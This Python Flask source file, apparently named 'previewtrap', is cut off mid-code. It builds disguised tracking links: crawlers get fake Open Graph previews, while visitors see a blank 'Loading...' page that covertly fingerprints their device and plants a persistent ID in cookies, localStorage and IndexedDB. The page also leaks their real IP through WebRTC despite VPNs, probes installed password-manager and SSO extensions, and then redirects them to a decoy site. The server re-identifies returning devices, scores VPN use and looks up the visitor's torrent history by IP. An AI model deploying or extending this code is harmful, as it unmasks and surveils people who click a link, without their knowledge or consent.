from flask import Flask, request, redirect, render_template_string, make_response, jsonify
import json
import os
import uuid
from datetime import datetime, timezone
import requests

app = Flask(__name__)

# ── Configuration ─────────────────────────────────────────────────────────────
REDIRECT_URL   = os.environ.get("REDIRECT_URL", "https://www.airbnb.com")
LOG_FILE       = os.environ.get("LOG_FILE", "logs.json")
LINKS_FILE     = os.environ.get("LINKS_FILE", "links.json")
OG_TITLE       = os.environ.get("OG_TITLE",       "Check this out")
OG_DESCRIPTION = os.environ.get("OG_DESCRIPTION", "")
OG_IMAGE       = os.environ.get("OG_IMAGE",       "")
OG_URL         = os.environ.get("OG_URL",         "")

# ── Complete IANA timezone -> ISO 3166-1 alpha-2 country code mapping ─────────
TZ_COUNTRY = {
    # Africa
    "Africa/Abidjan": "CI", "Africa/Accra": "GH", "Africa/Addis_Ababa": "ET",
    "Africa/Algiers": "DZ", "Africa/Asmara": "ER", "Africa/Bamako": "ML",
    "Africa/Bangui": "CF", "Africa/Banjul": "GM", "Africa/Bissau": "GW",
    "Africa/Blantyre": "MW", "Africa/Brazzaville": "CG", "Africa/Bujumbura": "BI",
    "Africa/Cairo": "EG", "Africa/Casablanca": "MA", "Africa/Ceuta": "ES",
    "Africa/Conakry": "GN", "Africa/Dakar": "SN", "Africa/Dar_es_Salaam": "TZ",
    "Africa/Djibouti": "DJ", "Africa/Douala": "CM", "Africa/El_Aaiun": "EH",
    "Africa/Freetown": "SL", "Africa/Gaborone": "BW", "Africa/Harare": "ZW",
    "Africa/Johannesburg": "ZA", "Africa/Juba": "SS", "Africa/Kampala": "UG",
    "Africa/Khartoum": "SD", "Africa/Kigali": "RW", "Africa/Kinshasa": "CD",
    "Africa/Lagos": "NG", "Africa/Libreville": "GA", "Africa/Lome": "TG",
    "Africa/Luanda": "AO", "Africa/Lubumbashi": "CD", "Africa/Lusaka": "ZM",
    "Africa/Malabo": "GQ", "Africa/Maputo": "MZ", "Africa/Maseru": "LS",
    "Africa/Mbabane": "SZ", "Africa/Mogadishu": "SO", "Africa/Monrovia": "LR",
    "Africa/Nairobi": "KE", "Africa/Ndjamena": "TD", "Africa/Niamey": "NE",
    "Africa/Nouakchott": "MR", "Africa/Ouagadougou": "BF", "Africa/Porto-Novo": "BJ",
    "Africa/Sao_Tome": "ST", "Africa/Tripoli": "LY", "Africa/Tunis": "TN",
    "Africa/Windhoek": "NA",
    # America
    "America/Adak": "US", "America/Anchorage": "US", "America/Anguilla": "AI",
    "America/Antigua": "AG", "America/Araguaina": "BR", "America/Argentina/Buenos_Aires": "AR",
    "America/Argentina/Catamarca": "AR", "America/Argentina/Cordoba": "AR",
    "America/Argentina/Jujuy": "AR", "America/Argentina/La_Rioja": "AR",
    "America/Argentina/Mendoza": "AR", "America/Argentina/Rio_Gallegos": "AR",
    "America/Argentina/Salta": "AR", "America/Argentina/San_Juan": "AR",
    "America/Argentina/San_Luis": "AR", "America/Argentina/Tucuman": "AR",
    "America/Argentina/Ushuaia": "AR", "America/Aruba": "AW", "America/Asuncion": "PY",
    "America/Atikokan": "CA", "America/Bahia": "BR", "America/Bahia_Banderas": "MX",
    "America/Barbados": "BB", "America/Belem": "BR", "America/Belize": "BZ",
    "America/Blanc-Sablon": "CA", "America/Boa_Vista": "BR", "America/Bogota": "CO",
    "America/Boise": "US", "America/Cambridge_Bay": "CA", "America/Campo_Grande": "BR",
    "America/Cancun": "MX", "America/Caracas": "VE", "America/Cayenne": "GF",
    "America/Cayman": "KY", "America/Chicago": "US", "America/Chihuahua": "MX",
    "America/Ciudad_Juarez": "MX", "America/Costa_Rica": "CR", "America/Creston": "CA",
    "America/Cuiaba": "BR", "America/Curacao": "CW", "America/Danmarkshavn": "GL",
    "America/Dawson": "CA", "America/Dawson_Creek": "CA", "America/Denver": "US",
    "America/Detroit": "US", "America/Dominica": "DM", "America/Edmonton": "CA",
    "America/Eirunepe": "BR", "America/El_Salvador": "SV", "America/Fortaleza": "BR",
    "America/Glace_Bay": "CA", "America/Godthab": "GL", "America/Goose_Bay": "CA",
    "America/Grand_Turk": "TC", "America/Grenada": "GD", "America/Guadeloupe": "GP",
    "America/Guatemala": "GT", "America/Guayaquil": "EC", "America/Guyana": "GY",
    "America/Halifax": "CA", "America/Havana": "CU", "America/Hermosillo": "MX",
    "America/Indiana/Indianapolis": "US", "America/Indiana/Knox": "US",
    "America/Indiana/Marengo": "US", "America/Indiana/Petersburg": "US",
    "America/Indiana/Tell_City": "US", "America/Indiana/Vevay": "US",
    "America/Indiana/Vincennes": "US", "America/Indiana/Winamac": "US",
    "America/Inuvik": "CA", "America/Iqaluit": "CA", "America/Jamaica": "JM",
    "America/Juneau": "US", "America/Kentucky/Louisville": "US",
    "America/Kentucky/Monticello": "US", "America/Kralendijk": "BQ",
    "America/La_Paz": "BO", "America/Lima": "PE", "America/Los_Angeles": "US",
    "America/Lower_Princes": "SX", "America/Maceio": "BR", "America/Managua": "NI",
    "America/Manaus": "BR", "America/Marigot": "MF", "America/Martinique": "MQ",
    "America/Matamoros": "MX", "America/Mazatlan": "MX", "America/Menominee": "US",
    "America/Merida": "MX", "America/Metlakatla": "US", "America/Mexico_City": "MX",
    "America/Miquelon": "PM", "America/Moncton": "CA", "America/Monterrey": "MX",
    "America/Montevideo": "UY", "America/Montserrat": "MS", "America/Nassau": "BS",
    "America/New_York": "US", "America/Nipigon": "CA", "America/Nome": "US",
    "America/Noronha": "BR", "America/North_Dakota/Beulah": "US",
    "America/North_Dakota/Center": "US", "America/North_Dakota/New_Salem": "US",
    "America/Nuuk": "GL", "America/Ojinaga": "MX", "America/Panama": "PA",
    "America/Pangnirtung": "CA", "America/Paramaribo": "SR", "America/Phoenix": "US",
    "America/Port-au-Prince": "HT", "America/Port_of_Spain": "TT",
    "America/Porto_Velho": "BR", "America/Puerto_Rico": "PR", "America/Punta_Arenas": "CL",
    "America/Rainy_River": "CA", "America/Rankin_Inlet": "CA", "America/Recife": "BR",
    "America/Regina": "CA", "America/Resolute": "CA", "America/Rio_Branco": "BR",
    "America/Santarem": "BR", "America/Santiago": "CL", "America/Santo_Domingo": "DO",
    "America/Sao_Paulo": "BR", "America/Scoresbysund": "GL", "America/Sitka": "US",
    "America/St_Barthelemy": "BL", "America/St_Johns": "CA", "America/St_Kitts": "KN",
    "America/St_Lucia": "LC", "America/St_Thomas": "VI", "America/St_Vincent": "VC",
    "America/Swift_Current": "CA", "America/Tegucigalpa": "HN", "America/Thule": "GL",
    "America/Thunder_Bay": "CA", "America/Tijuana": "MX", "America/Toronto": "CA",
    "America/Tortola": "VG", "America/Vancouver": "CA", "America/Whitehorse": "CA",
    "America/Winnipeg": "CA", "America/Yakutat": "US", "America/Yellowknife": "CA",
    # Antarctica
    "Antarctica/Casey": "AQ", "Antarctica/Davis": "AQ", "Antarctica/DumontDUrville": "AQ",
    "Antarctica/Macquarie": "AU", "Antarctica/Mawson": "AQ", "Antarctica/McMurdo": "AQ",
    "Antarctica/Palmer": "AQ", "Antarctica/Rothera": "AQ", "Antarctica/Syowa": "AQ",
    "Antarctica/Troll": "AQ", "Antarctica/Vostok": "AQ",
    # Arctic
    "Arctic/Longyearbyen": "SJ",
    # Asia
    "Asia/Aden": "YE", "Asia/Almaty": "KZ", "Asia/Amman": "JO", "Asia/Anadyr": "RU",
    "Asia/Aqtau": "KZ", "Asia/Aqtobe": "KZ", "Asia/Ashgabat": "TM",
    "Asia/Atyrau": "KZ", "Asia/Baghdad": "IQ", "Asia/Bahrain": "BH",
    "Asia/Baku": "AZ", "Asia/Bangkok": "TH", "Asia/Barnaul": "RU",
    "Asia/Beirut": "LB", "Asia/Bishkek": "KG", "Asia/Brunei": "BN",
    "Asia/Chita": "RU", "Asia/Choibalsan": "MN", "Asia/Colombo": "LK",
    "Asia/Damascus": "SY", "Asia/Dhaka": "BD", "Asia/Dili": "TL",
    "Asia/Dubai": "AE", "Asia/Dushanbe": "TJ", "Asia/Famagusta": "CY",
    "Asia/Gaza": "PS", "Asia/Hebron": "PS", "Asia/Ho_Chi_Minh": "VN",
    "Asia/Hong_Kong": "HK", "Asia/Hovd": "MN", "Asia/Irkutsk": "RU",
    "Asia/Jakarta": "ID", "Asia/Jayapura": "ID", "Asia/Jerusalem": "IL",
    "Asia/Kabul": "AF", "Asia/Kamchatka": "RU", "Asia/Karachi": "PK",
    "Asia/Kathmandu": "NP", "Asia/Khandyga": "RU", "Asia/Kolkata": "IN",
    "Asia/Krasnoyarsk": "RU", "Asia/Kuala_Lumpur": "MY", "Asia/Kuching": "MY",
    "Asia/Kuwait": "KW", "Asia/Macau": "MO", "Asia/Magadan": "RU",
    "Asia/Makassar": "ID", "Asia/Manila": "PH", "Asia/Muscat": "OM",
    "Asia/Nicosia": "CY", "Asia/Novokuznetsk": "RU", "Asia/Novosibirsk": "RU",
    "Asia/Omsk": "RU", "Asia/Oral": "KZ", "Asia/Phnom_Penh": "KH",
    "Asia/Pontianak": "ID", "Asia/Pyongyang": "KP", "Asia/Qatar": "QA",
    "Asia/Qostanay": "KZ", "Asia/Qyzylorda": "KZ", "Asia/Riyadh": "SA",
    "Asia/Sakhalin": "RU", "Asia/Samarkand": "UZ", "Asia/Seoul": "KR",
    "Asia/Shanghai": "CN", "Asia/Singapore": "SG", "Asia/Srednekolymsk": "RU",
    "Asia/Taipei": "TW", "Asia/Tashkent": "UZ", "Asia/Tbilisi": "GE",
    "Asia/Tehran": "IR", "Asia/Thimphu": "BT", "Asia/Tokyo": "JP",
    "Asia/Tomsk": "RU", "Asia/Ulaanbaatar": "MN", "Asia/Urumqi": "CN",
    "Asia/Ust-Nera": "RU", "Asia/Vientiane": "LA", "Asia/Vladivostok": "RU",
    "Asia/Yakutsk": "RU", "Asia/Yangon": "MM", "Asia/Yekaterinburg": "RU",
    "Asia/Yerevan": "AM",
    # Atlantic
    "Atlantic/Azores": "PT", "Atlantic/Bermuda": "BM", "Atlantic/Canary": "ES",
    "Atlantic/Cape_Verde": "CV", "Atlantic/Faroe": "FO", "Atlantic/Madeira": "PT",
    "Atlantic/Reykjavik": "IS", "Atlantic/South_Georgia": "GS",
    "Atlantic/St_Helena": "SH", "Atlantic/Stanley": "FK",
    # Australia
    "Australia/Adelaide": "AU", "Australia/Brisbane": "AU", "Australia/Broken_Hill": "AU",
    "Australia/Darwin": "AU", "Australia/Eucla": "AU", "Australia/Hobart": "AU",
    "Australia/Lindeman": "AU", "Australia/Lord_Howe": "AU", "Australia/Melbourne": "AU",
    "Australia/Perth": "AU", "Australia/Sydney": "AU",
    # Europe
    "Europe/Amsterdam": "NL", "Europe/Andorra": "AD", "Europe/Astrakhan": "RU",
    "Europe/Athens": "GR", "Europe/Belgrade": "RS", "Europe/Berlin": "DE",
    "Europe/Bratislava": "SK", "Europe/Brussels": "BE", "Europe/Bucharest": "RO",
    "Europe/Budapest": "HU", "Europe/Busingen": "DE", "Europe/Chisinau": "MD",
    "Europe/Copenhagen": "DK", "Europe/Dublin": "IE", "Europe/Gibraltar": "GI",
    "Europe/Guernsey": "GG", "Europe/Helsinki": "FI", "Europe/Isle_of_Man": "IM",
    "Europe/Istanbul": "TR", "Europe/Jersey": "JE", "Europe/Kaliningrad": "RU",
    "Europe/Kiev": "UA", "Europe/Kirov": "RU", "Europe/Kyiv": "UA",
    "Europe/Lisbon": "PT", "Europe/Ljubljana": "SI", "Europe/London": "GB",
    "Europe/Luxembourg": "LU", "Europe/Madrid": "ES", "Europe/Malta": "MT",
    "Europe/Mariehamn": "AX", "Europe/Minsk": "BY", "Europe/Monaco": "MC",
    "Europe/Moscow": "RU", "Europe/Nicosia": "CY", "Europe/Oslo": "NO",
    "Europe/Paris": "FR", "Europe/Podgorica": "ME", "Europe/Prague": "CZ",
    "Europe/Riga": "LV", "Europe/Rome": "IT", "Europe/Samara": "RU",
    "Europe/San_Marino": "SM", "Europe/Sarajevo": "BA", "Europe/Saratov": "RU",
    "Europe/Simferopol": "UA", "Europe/Skopje": "MK", "Europe/Sofia": "BG",
    "Europe/Stockholm": "SE", "Europe/Tallinn": "EE", "Europe/Tirane": "AL",
    "Europe/Ulyanovsk": "RU", "Europe/Uzhgorod": "UA", "Europe/Vaduz": "LI",
    "Europe/Vatican": "VA", "Europe/Vienna": "AT", "Europe/Vilnius": "LT",
    "Europe/Volgograd": "RU", "Europe/Warsaw": "PL", "Europe/Zagreb": "HR",
    "Europe/Zaporozhye": "UA", "Europe/Zurich": "CH",
    # Indian
    "Indian/Antananarivo": "MG", "Indian/Chagos": "IO", "Indian/Christmas": "CX",
    "Indian/Cocos": "CC", "Indian/Comoro": "KM", "Indian/Kerguelen": "TF",
    "Indian/Mahe": "SC", "Indian/Maldives": "MV", "Indian/Mauritius": "MU",
    "Indian/Mayotte": "YT", "Indian/Reunion": "RE",
    # Pacific
    "Pacific/Apia": "WS", "Pacific/Auckland": "NZ", "Pacific/Bougainville": "PG",
    "Pacific/Chatham": "NZ", "Pacific/Chuuk": "FM", "Pacific/Easter": "CL",
    "Pacific/Efate": "VU", "Pacific/Enderbury": "KI", "Pacific/Fakaofo": "TK",
    "Pacific/Fiji": "FJ", "Pacific/Funafuti": "TV", "Pacific/Galapagos": "EC",
    "Pacific/Gambier": "PF", "Pacific/Guadalcanal": "SB", "Pacific/Guam": "GU",
    "Pacific/Honolulu": "US", "Pacific/Kanton": "KI", "Pacific/Kiritimati": "KI",
    "Pacific/Kosrae": "FM", "Pacific/Kwajalein": "MH", "Pacific/Majuro": "MH",
    "Pacific/Marquesas": "PF", "Pacific/Midway": "UM", "Pacific/Nauru": "NR",
    "Pacific/Niue": "NU", "Pacific/Norfolk": "NF", "Pacific/Noumea": "NC",
    "Pacific/Pago_Pago": "AS", "Pacific/Palau": "PW", "Pacific/Pitcairn": "PN",
    "Pacific/Pohnpei": "FM", "Pacific/Port_Moresby": "PG", "Pacific/Rarotonga": "CK",
    "Pacific/Saipan": "MP", "Pacific/Tahiti": "PF", "Pacific/Tarawa": "KI",
    "Pacific/Tongatapu": "TO", "Pacific/Wake": "UM", "Pacific/Wallis": "WF",
    # UTC
    "UTC": "XX", "Etc/UTC": "XX", "Etc/GMT": "XX",
}

# ── Comprehensive crawler User-Agent list ──────────────────────────────────────
CRAWLERS = [
    "TelegramBot", "Discordbot", "Twitterbot", "Slackbot",
    "WhatsApp", "facebookexternalhit", "FacebookBot", "LinkedInBot",
    "iMessageBot", "Googlebot", "bingbot", "Applebot",
    "Viber", "Line/", "SkypeUriPreview", "Snapchat",
    "Pinterest", "Tumblr", "redditbot", "vkShare",
    "W3C_Validator", "curl/", "python-requests", "Go-http-client",
    "Wget/", "libwww-perl", "Jakarta Commons-HttpClient",
]

# ── Comprehensive VPN / datacenter ISP hints ──────────────────────────────────
VPN_ISP_HINTS = [
    # VPN brands
    "mullvad", "nordvpn", "expressvpn", "surfshark", "ipvanish",
    "cyberghost", "hidemyass", "protonvpn", "privateinternetaccess",
    "windscribe", "torguard", "perfect privacy", "ovpn", "azirevpn",
    "hide.me", "privado", "purevpn", "hotspot shield", "tunnelbear",
    "vyprvpn", "astrill", "strongvpn", "safervpn", "zenmate",
    "boxpn", "ivpn", "airvpn", "cactus vpn", "trust.zone",
    "frootvpn", "ra4w vpn", "vpn.ac", "cryptostorm",
    # Hosting / datacenter providers
    "m247", "datacamp", "vultr", "digitalocean", "linode", "akamai",
    "hetzner", "ovh", "choopa", "peg tech", "serverius",
    "leaseweb", "cogent", "psychz", "quadranet", "tzulo",
    "hostwinds", "liquidweb", "ramnode", "buyvm", "frantech",
    "hostus", "online s.a.s", "scaleway", "packet", "equinix",
    "zenlayer", "hostkey", "nexeon", "sharktech", "colocrossing",
    "reliablesite", "dacentec", "micfo", "servermania",
    "amazon", "google cloud", "microsoft azure", "cloudflare",
    "fastly", "incapsula", "sucuri", "path network",
]

# ── Extended font probe list ───────────────────────────────────────────────────
PROBE_FONTS = [
    # Windows
    "Arial", "Arial Black", "Arial Narrow", "Calibri", "Cambria",
    "Comic Sans MS", "Consolas", "Courier New", "Georgia", "Impact",
    "Lucida Console", "Lucida Sans Unicode", "Microsoft Sans Serif",
    "Palatino Linotype", "Segoe UI", "Tahoma", "Times New Roman",
    "Trebuchet MS", "Verdana", "Webdings", "Wingdings",
    # macOS / iOS
    "Helvetica Neue", "Helvetica", "Futura", "Geneva", "Gill Sans",
    "Optima", "Palatino", "San Francisco", "Menlo", "Monaco",
    "American Typewriter", "Baskerville", "Didot", "Hoefler Text",
    "Zapf Dingbats", "Marker Felt", "Chalkboard SE",
    # Linux
    "DejaVu Sans", "DejaVu Serif", "DejaVu Sans Mono",
    "Liberation Sans", "Liberation Serif", "Liberation Mono",
    "Ubuntu", "Noto Sans", "Noto Serif", "FreeSans", "FreeSerif",
    # Arabic / RTL (useful for regional identification)
    "Arabic Typesetting", "Simplified Arabic", "Traditional Arabic",
    "Scheherazade", "Amiri", "Cairo",
    # CJK
    "MS Gothic", "MS Mincho", "SimSun", "SimHei", "NSimSun",
    "FangSong", "KaiTi", "Microsoft YaHei", "Microsoft JhengHei",
    "MingLiU", "PMingLiU", "Malgun Gothic",
]

# ── File helpers ───────────────────────────────────────────────────────────────

def read_json(path, default):
    if not os.path.exists(path):
        return default
    with open(path) as f:
        try:
            return json.load(f)
        except Exception:
            return default

def write_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

# ── Fingerprint similarity matching ───────────────────────────────────────────

def jaccard(a, b):
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    sa, sb = set(a), set(b)
    return len(sa & sb) / len(sa | sb)

def compare_fingerprints(fp_a, fp_b):
    comparisons = {}
    score = 0
    max_score = 0

    def check(key, weight, match_fn=None):
        nonlocal score, max_score
        max_score += weight
        va = fp_a.get(key)
        vb = fp_b.get(key)
        if va is None or vb is None:
            comparisons[key] = {"a": va, "b": vb, "match": None, "note": "missing in one hit"}
            return
        if match_fn:
            similarity = match_fn(va, vb)
            matched = similarity >= 0.8
            earned = round(weight * similarity)
        else:
            matched = (va == vb)
            similarity = 1.0 if matched else 0.0
            earned = weight if matched else 0
        score += earned
        comparisons[key] = {
            "a": va, "b": vb,
            "match": matched,
            "similarity": round(similarity, 3),
            "weight": weight,
            "earned": earned,
        }

    check("canvas_fp",            90)
    check("audio_fp",             85)
    check("webgl_renderer",       70)
    check("webgl_vendor",         30)
    check("screen_w",             20)
    check("screen_h",             20)
    check("device_pixel_ratio",   20)
    check("hardware_concurrency", 15)
    check("device_memory",        15)
    check("color_depth",          10)
    check("platform",             20)
    check("fonts", 40, lambda a, b: jaccard(a, b))
    check("timezone",             25)
    check("language",             10)
    check("touch",                10)
    check("connection_type",       5)
    check("pdf_viewer_enabled",    5)
    check("plugins_count",         5)

    final_score = round((score / max_score) * 100) if max_score > 0 else 0

    if final_score >= 80:   verdict = "almost_certainly_same_device"
    elif final_score >= 60: verdict = "probably_same_device"
    elif final_score >= 40: verdict = "possibly_same_device"
    else:                   verdict = "likely_different_device"

    return {"score": final_score, "verdict": verdict, "comparisons": comparisons}

def find_matches(new_fp, all_logs, new_visitor_id, threshold=40):
    matches = []
    for entry in all_logs:
        existing_fp = entry.get("fingerprint", {})
        if not existing_fp:
            continue
        result = compare_fingerprints(new_fp, existing_fp)
        if result["score"] >= threshold:
            matches.append({
                "visitor_id":  entry.get("visitor_id"),
                "timestamp":   entry.get("timestamp"),
                "ip":          entry.get("ip"),
                "score":       result["score"],
                "verdict":     result["verdict"],
                "comparisons": result["comparisons"],
            })
    matches.sort(key=lambda x: x["score"], reverse=True)
    return matches

# ── VPN confidence scoring ────────────────────────────────────────────────────

def vpn_confidence(geo, browser_tz, ua):
    score = 0
    reasons = []

    if geo.get("hosting"):
        score += 40
        reasons.append("IP belongs to a datacenter/hosting provider")
    if geo.get("proxy"):
        score += 40
        reasons.append("IP flagged as proxy by ip-api")

    isp = (geo.get("isp") or "").lower()
    org = (geo.get("org") or "").lower()
    for hint in VPN_ISP_HINTS:
        if hint in isp or hint in org:
            score += 30
            reasons.append(f"ISP/org matches known VPN or datacenter: {geo.get('isp')}")
            break

    if browser_tz:
        tz_country = TZ_COUNTRY.get(browser_tz)
        ip_country  = geo.get("countryCode") or geo.get("country", "")
        if tz_country and tz_country != "XX" and ip_country:
            if tz_country.upper() != ip_country.upper():
                score += 35
                reasons.append(
                    f"Timezone ({browser_tz} -> {tz_country}) "
                    f"does not match IP country ({ip_country})"
                )
        elif not tz_country:
            reasons.append(f"Timezone '{browser_tz}' not in lookup table -- check manually")

    is_mobile_ua = any(k in ua for k in ["iPhone", "Android", "Mobile"])
    if is_mobile_ua and geo.get("hosting"):
        score += 15
        reasons.append("Mobile device routing through datacenter IP")

    score = min(score, 100)
    if score <= 30:   verdict = "probably_real"
    elif score <= 60: verdict = "possibly_vpn"
    else:             verdict = "almost_certainly_vpn"

    return {"score": score, "verdict": verdict, "reasons": reasons}

# ── Helpers ───────────────────────────────────────────────────────────────────

def is_crawler(user_agent):
    ua = user_agent or ""
    return any(c.lower() in ua.lower() for c in CRAWLERS)

def geolocate(ip):
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}"
            f"?fields=country,countryCode,regionName,city,isp,org,mobile,proxy,hosting",
            timeout=3,
        )
        return r.json()
    except Exception:
        return {}

def torrent_lookup(ip):
    """Query iknowwhatyoudownload.com for public torrent history on this IP."""
    try:
        r = requests.get(
            f"https://iknowwhatyoudownload.com/en/peer/?ip={ip}",
            timeout=5,
            headers={"User-Agent": "Mozilla/5.0"},
        )
        # Parse basic results -- the free version returns HTML, look for torrent names
        if r.status_code == 200:
            import re
            titles = re.findall(r'<td class="title"[^>]*>(.*?)</td>', r.text)
            titles = [t.strip() for t in titles[:10] if t.strip()]
            return {"found": len(titles) > 0, "titles": titles, "count": len(titles)}
        return {"found": False, "titles": [], "count": 0}
    except Exception:
        return {"found": False, "titles": [], "count": 0, "error": "lookup failed"}

def log_hit(entry):
    logs = read_json(LOG_FILE, [])
    logs.append(entry)
    write_json(LOG_FILE, logs)
    geo = entry.get("geo", {})
    vpn = entry.get("vpn", {})
    fp  = entry.get("fingerprint", {})
    top_match = (entry.get("matches") or [{}])[0]
    print(
        f"[HIT] {entry['timestamp']} | {entry['ip']} | "
        f"{geo.get('city','?')}, {geo.get('country','?')} | "
        f"VPN:{vpn.get('verdict','?')}({vpn.get('score','?')}) | "
        f"TZ:{fp.get('timezone','?')} | "
        f"visitor:{entry.get('visitor_id','?')} | "
        f"returning:{entry.get('returning_visitor',False)} | "
        f"top_match:{top_match.get('score','none')}({top_match.get('verdict','')})"
    )

# ── Link management ───────────────────────────────────────────────────────────

def get_link(link_id):
    return read_json(LINKS_FILE, {}).get(link_id)

def save_link(link_id, config):
    links = read_json(LINKS_FILE, {})
    links[link_id] = config
    write_json(LINKS_FILE, links)

def increment_link_clicks(link_id):
    links = read_json(LINKS_FILE, {})
    if link_id in links:
        links[link_id]["clicks"] = links[link_id].get("clicks", 0) + 1
        write_json(LINKS_FILE, links)

def link_is_valid(config):
    if not config:
        return False, "link not found"
    max_clicks = config.get("max_clicks")
    if max_clicks is not None and config.get("clicks", 0) >= max_clicks:
        return False, "click limit reached"
    expires_at = config.get("expires_at")
    if expires_at:
        exp = datetime.fromisoformat(expires_at)
        if datetime.now(timezone.utc) > exp:
            return False, "link expired"
    return True, None

# ── Templates ─────────────────────────────────────────────────────────────────

PREVIEW_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta property="og:title"       content="{{ title }}">
  <meta property="og:description" content="{{ description }}">
  <meta property="og:image"       content="{{ image }}">
  <meta property="og:url"         content="{{ url }}">
  <meta name="twitter:card"        content="summary_large_image">
  <meta name="twitter:title"       content="{{ title }}">
  <meta name="twitter:description" content="{{ description }}">
  <meta name="twitter:image"       content="{{ image }}">
  <title>{{ title }}</title>
</head>
<body></body>
</html>"""

FINGERPRINT_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Loading...</title>
  <style>body{background:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}
</head>
<body>
<script>
(async function() {
  const t0 = performance.now();
  const VISITOR_KEY = "_vid";
  const REDIRECT    = {{ redirect_url | tojson }};
  const LINK_ID     = {{ link_id | tojson }};

  function getCookie(name) {
    const m = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
    return m ? decodeURIComponent(m[1]) : null;
  }
  function setCookie(name, value, days) {
    const exp = new Date(Date.now() + days * 864e5).toUTCString();
    document.cookie = name + "=" + encodeURIComponent(value) +
                      "; expires=" + exp + "; path=/; SameSite=Lax";
  }
  function uuidv4() {
    return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
      (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16));
  }

  let visitorId = getCookie(VISITOR_KEY) || localStorage.getItem(VISITOR_KEY);
  let returning = !!visitorId;

  if (!visitorId) {
    try {
      visitorId = await new Promise(res => {
        const req = indexedDB.open("_fpdb", 1);
        req.onupgradeneeded = e => e.target.result.createObjectStore("kv");
        req.onsuccess = e => {
          const db = e.target.result;
          const tx = db.transaction("kv", "readonly");
          const get = tx.objectStore("kv").get(VISITOR_KEY);
          get.onsuccess = () => res(get.result || null);
          get.onerror   = () => res(null);
        };
        req.onerror = () => res(null);
      });
      if (visitorId) returning = true;
    } catch(e) {}
  }

  if (!visitorId) visitorId = uuidv4();

  setCookie(VISITOR_KEY, visitorId, 365);
  try { localStorage.setItem(VISITOR_KEY, visitorId); } catch(e) {}
  try {
    const req = indexedDB.open("_fpdb", 1);
    req.onsuccess = e => {
      const db = e.target.result;
      const tx = db.transaction("kv", "readwrite");
      tx.objectStore("kv").put(visitorId, VISITOR_KEY);
    };
  } catch(e) {}

  const data = {
    visitor_id: visitorId,
    returning:  returning,
    link_id:    LINK_ID,
    timezone:   Intl.DateTimeFormat().resolvedOptions().timeZone,
    language:   navigator.language,
    languages:  navigator.languages ? [...navigator.languages] : [],
    screen_w:   screen.width,
    screen_h:   screen.height,
    color_depth: screen.colorDepth,
    device_memory: navigator.deviceMemory || null,
    hardware_concurrency: navigator.hardwareConcurrency || null,
    touch: navigator.maxTouchPoints > 0,
    max_touch_points: navigator.maxTouchPoints,
    platform: navigator.platform,
    do_not_track: navigator.doNotTrack,
    referrer: document.referrer || null,
    connection_type: null,
    connection_downlink: null,
  };

  if (navigator.connection) {
    data.connection_type     = navigator.connection.effectiveType;
    data.connection_downlink = navigator.connection.downlink;
  }

  try {
    const b = await navigator.getBattery();
    data.battery_level    = Math.round(b.level * 100);
    data.battery_charging = b.charging;
  } catch(e) {}

  try {
    const c = document.createElement("canvas");
    c.width = 200; c.height = 40;
    const ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(0, 0, 200, 40);
    ctx.fillStyle = "#069";
    ctx.fillText("previewtrap_fp", 2, 2);
    ctx.fillStyle = "rgba(102,204,0,0.7)";
    ctx.fillText("previewtrap_fp", 4, 4);
    data.canvas_fp = c.toDataURL().slice(-48);
  } catch(e) {}

  try {
    const gl = document.createElement("canvas").getContext("webgl");
    if (gl) {
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) {
        data.webgl_vendor   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
        data.webgl_renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
      }
      data.webgl_version = gl.getParameter(gl.VERSION);
    }
  } catch(e) {}

  // ── Enhanced WebRTC (full ICE candidate collection) ──────────────────────
  try {
    const webrtcData = await new Promise(res => {
      const pc = new RTCPeerConnection({
        iceServers: [
          {urls: "stun:stun.l.google.com:19302"},
          {urls: "stun:stun1.l.google.com:19302"},
          {urls: "stun:stun.cloudflare.com:3478"},
        ]
      });
      const ips      = new Set();
      const mdns     = new Set();
      const rawCands = [];
      pc.createDataChannel("");
      pc.createOffer().then(o => pc.setLocalDescription(o));
      pc.onicecandidate = e => {
        if (!e.candidate) {
          pc.close();
          res({ ips: [...ips], mdns: [...mdns], raw_candidates: rawCands });
          return;
        }
        const c = e.candidate.candidate;
        rawCands.push(c);
        // IPv4/IPv6
        const ipMatches = c.match(/(\d+\.\d+\.\d+\.\d+|[0-9a-f]{0,4}(?::[0-9a-f]{0,4}){2,7})/gi);
        if (ipMatches) ipMatches.forEach(ip => {
          if (!ip.startsWith("0.") && ip !== "0.0.0.0") ips.add(ip);
        });
        // mDNS hostnames (.local)
        const mdnsMatch = c.match(/([a-f0-9-]+\.local)/i);
        if (mdnsMatch) mdns.add(mdnsMatch[1]);
      };
      setTimeout(() => {
        pc.close();
        res({ ips: [...ips], mdns: [...mdns], raw_candidates: rawCands });
      }, 3000);
    });
    data.webrtc_ips        = webrtcData.ips;
    data.webrtc_mdns       = webrtcData.mdns;
    data.webrtc_candidates = webrtcData.raw_candidates;
  } catch(e) {}

  // ── Browser extension fingerprinting (Chromium desktop only) ─────────────
  // Probes web-accessible resources of known extensions.
  // Silent on Safari/Firefox/mobile -- try/catch handles gracefully.
  try {
    const EXT_PROBE = [
      // Password managers
      ["1Password",         "aomjjhallfgjeglblehebfpbcfeobpgk"],
      ["LastPass",          "hdokiejnpimakedhajhdlcegeplioahd"],
      ["Bitwarden",         "nngceckbapebfimnlniiiahkandclblb"],
      ["Dashlane",          "fdjamakpfbbddfjaooikfcpapjohcfmg"],
      ["Keeper",            "bfogiafebfohielmmehodmfbbebbbpei"],
      // SSO / corporate auth
      ["Okta",              "glnpjglilkicbckjpbgcfkogebgllemb"],
      ["Duo",               "eidkifbnbdbbalgadhemmmdpagjnmkjf"],
